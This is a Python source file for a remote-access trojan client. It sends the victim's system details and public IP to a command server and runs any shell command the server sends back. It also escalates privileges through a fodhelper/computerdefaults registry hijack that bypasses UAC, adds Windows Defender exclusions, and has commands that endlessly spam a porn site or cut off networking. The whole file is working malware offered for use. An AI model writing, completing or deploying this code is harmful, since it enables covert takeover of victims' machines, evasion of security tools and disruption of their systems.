import socket
import platform
import time
import getpass
import os
import subprocess
import base64
from urllib.request import urlopen
import json
import ctypes
import sys
from typing import Tuple
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class UACBypass:
    def __init__(self):
        self.executable_path, self.is_frozen = self.get_self()

    def execute_command(self, cmd: str):
        return subprocess.run(cmd, shell=True, capture_output=True)

    def check_log_change(self, method: str) -> bool:
        log_cmd = 'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'
        log_count_before = len(self.execute_command(log_cmd).stdout)
        self.execute_command(f"{method} --nouacbypass")
        log_count_after = len(self.execute_command(log_cmd).stdout)
        return log_count_after > log_count_before

    def uac_bypass(self, method: int = 1) -> bool:
        if not self.is_frozen:
            return False

        reg_add_cmd = f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{self.executable_path}\" /f"
        reg_delete_cmd = "reg delete hkcu\\Software\\Classes\\ms-settings /f"
        
        self.execute_command(reg_add_cmd)
        self.execute_command("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
        
        if method == 1:
            if self.check_log_change("computerdefaults"):
                self.execute_command(reg_delete_cmd)
                return self.uac_bypass(method + 1)
        elif method == 2:
            if self.check_log_change("fodhelper"):
                self.execute_command(reg_delete_cmd)
                return self.uac_bypass(method + 1)
        else:
            return False
        
        self.execute_command(reg_delete_cmd)
        return True

    def is_admin(self) -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    def get_self(self) -> Tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    def doit(self):
        if not self.is_admin() and self.is_frozen and self.uac_bypass():
            os._exit(0)

def force_decode(b: bytes) -> str:
    """Force decode bytes to a string, handling Unicode errors."""
    try:
        return b.decode(json.detect_encoding(b))
    except UnicodeDecodeError:
        return b.decode(errors="backslashreplace")

def get_system_info() -> str:
    """Gather system information."""
    cos = platform.system()
    vos = platform.version()
    fin = f"{cos} {vos}"

    usern = getpass.getuser()
    cdir = os.getcwd()

    ip1 = f"IP address: {urlopen('https://ident.me').read().decode('utf-8')} [ident.me]"
    ip2 = f"IP address: {urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8')} [lafibre.info]"

    system_info = force_decode(subprocess.run('systeminfo', capture_output=True, shell=True).stdout).strip().replace('\\xff', ' ')
    
    scream = f"""
    New client:

    {ip1}
    {ip2}

    OS: {fin}

    Current User: {usern}
    Current Directory: {cdir}

    {system_info}
    """
    return scream

def troll():
    while True:
        os.system('start pornhub.com')

def handle_command(command: str, client_socket: socket.socket):
    if command == "Troll":
        troll()
    elif command == "Disable Network":
        while True:
            os.system("ipconfig /release")
    elif command.startswith("Bypass UAC"):
        uac_bypass = UACBypass()
        uac_bypass.doit()
        if uac_bypass.is_admin():
            client_socket.send("Admin Bypassed Successfully".encode('ascii'))
        else:
            client_socket.send("Admin Bypass Failed".encode('ascii'))
    elif command.startswith("Bypass Defender"):
        uac_bypass = UACBypass()
        if uac_bypass.is_admin():
            exclusion_paths = [os.getcwd()]
            for path in exclusion_paths:
                try:
                    subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
                    client_socket.send("Defender Bypassed Successfully".encode('ascii'))
                except Exception as e:
                    logging.error(f"Error bypassing defender: {e}")
                    client_socket.send("Defender Bypass Failed".encode('ascii'))
        else:
            client_socket.send("You need admin to bypass defender".encode('ascii'))
    else:
        feedbackraw = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip().replace('\\xff', ' ')
        feedback = f"Output: {feedbackraw}"
        client_socket.send(feedback.encode('ascii'))

def start_client():
    """Start the client and connect to the server."""
    scream = get_system_info()
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host = '127.0.0.1'
            port = 12345
            client_socket.connect((host, port))
            logging.info("Connected to server")

            # Send initial greeting message
            client_socket.send(scream.encode('ascii'))

            while True:
                response = client_socket.recv(1024).decode('ascii')
                logging.info(f"Received from server: {response}")
                handle_command(response, client_socket)
                
            client_socket.close()
            break
        
        except (ConnectionRefusedError, socket.error) as e:
            logging.error(f"Failed to connect to the server: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    start_client()
